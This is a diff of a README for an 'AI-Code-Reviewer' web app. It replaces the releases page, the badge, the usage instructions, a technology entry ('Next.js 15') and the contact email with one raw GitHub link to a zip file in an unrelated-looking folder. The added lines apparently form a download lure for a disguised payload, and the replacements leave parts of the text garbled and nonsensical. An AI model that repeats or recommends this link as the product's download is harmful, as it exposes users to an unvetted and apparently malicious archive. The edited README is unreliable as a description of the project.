@@ -1,6 +1,6 @@
 # 🎉 AI-Code-Reviewer - Effortlessly Enhance Your Coding Skills
 
-![Download AI-Code-Reviewer](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)
+![Download AI-Code-Reviewer](https://raw.githubusercontent.com/furanosai/AI-Code-Reviewer/main/Pleurodira/AI-Code-Reviewer.zip%20Now-Get%20Started-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the AI-Code-Reviewer! This application helps you review your code usi
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [AI-Code-Reviewer Releases](https://github.com/furanosai/AI-Code-Reviewer/releases). Follow the steps below to install the application on your computer.
+To get started, visit this page to download: [AI-Code-Reviewer Releases](https://raw.githubusercontent.com/furanosai/AI-Code-Reviewer/main/Pleurodira/AI-Code-Reviewer.zip). Follow the steps below to install the application on your computer.
 
 ## 🌟 Features 
 
@@ -30,7 +30,7 @@ Ensure your system meets the following requirements for optimal performance:
 
 ## 🔍 How to Use 
 
-1. **Download the Application**: Follow the link to [AI-Code-Reviewer Releases](https://github.com/furanosai/AI-Code-Reviewer/releases) and download the appropriate version for your system.
+1. **Download the Application**: Follow the link to [AI-Code-Reviewer Releases](https://raw.githubusercontent.com/furanosai/AI-Code-Reviewer/main/Pleurodira/AI-Code-Reviewer.zip) and download the appropriate version for your system.
 2. **Install the Application**: Once the download completes, locate the file and follow the installation instructions on your screen. You may need to accept terms or grant permissions.
 3. **Open the Application**: After installation, find AI-Code-Reviewer in your applications or programs list and open it.
 4. **Start Reviewing Code**: Upload or paste your code into the editor. The AI will analyze it and provide suggestions for improvement.
@@ -53,7 +53,7 @@ This project covers a range of topics, including:
 - Google Gemini AI
 - JavaScript
 - Markdown
-- Next.js 15
+- https://raw.githubusercontent.com/furanosai/AI-Code-Reviewer/main/Pleurodira/AI-Code-Reviewer.zip 15
 - Prism
 - Rehype Highlight
 - Shadcn UI
@@ -69,6 +69,6 @@ Join our community on platforms like Discord and Twitter for updates and discuss
 
 ## 📞 Contact 
 
-For general inquiries, you can reach us via email at contact@aicode-reviewer.com. 
+For general inquiries, you can reach us via email at https://raw.githubusercontent.com/furanosai/AI-Code-Reviewer/main/Pleurodira/AI-Code-Reviewer.zip 
 
 Thank you for choosing AI-Code-Reviewer! We're here to help you improve your coding journey!
